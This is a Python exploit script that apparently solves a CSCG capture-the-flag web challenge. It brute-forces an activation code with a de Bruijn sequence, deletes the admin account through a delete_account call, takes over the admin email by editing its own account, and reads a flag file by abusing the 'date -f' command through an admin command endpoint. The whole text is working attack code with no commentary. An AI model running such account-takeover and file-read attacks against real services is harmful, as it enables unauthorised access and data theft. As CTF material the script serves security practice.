from pwn import *
import requests

assert sys.argv[1:], f"python3 solv.py https://xx"
base = sys.argv[1]

activation = ''.join(de_bruijn("0123456789", 4)) # opensesame
groupid = "e00"
userid = "0010"

def create_and_login(session, info):
    res = s.post(base+"/json_api", json={"action": "login", "data": info})
    success = res.json()["return"] == "Success"
    if success:
        return
    res = s.post(base+"/json_api", json={"action": "create_account","data": info})
    print(res.json())
    res = s.post(base+"/json_api", json={"action": "login", "data": info})
    success = res.json()["return"] == "Success"
    assert success, res.json()

# TODO: async account_create requests?
log.info("creating first account")
s = requests.Session()
create_and_login(s, {
        "email": "mail1",
        "password": "password",
        "groupid": "000",
        "userid": "1000",
        "activation": activation
    })
s.post(base+"/json_api", json={
    "action": "login",
    "data": {
        "email": "mail1",
        "password": "password",
    }
})
s.post(base+"/json_api", json={
    "action": "delete_account",
    "data": {
        "email": "mail1",
        "other": "admin@cscg.de",
    }
})
log.info("creating haxxor account")

create_and_login(s, {
        "email": "mail2",
        "password": "password",
        "groupid": groupid,
        "userid": userid,
        "activation": activation
    })
print(s.post(base+"/json_api", json={
    "action": "edit_account",
    "data": {
        "email": "admin@cscg.de",
    }
}).text)

print(s.post(base+"/json_api", json={
    "action": "admin",
    "data": {
        "cmd": ["date", "-f", "/usr/src/app/flag.txt", "+u"],
    }
}).text)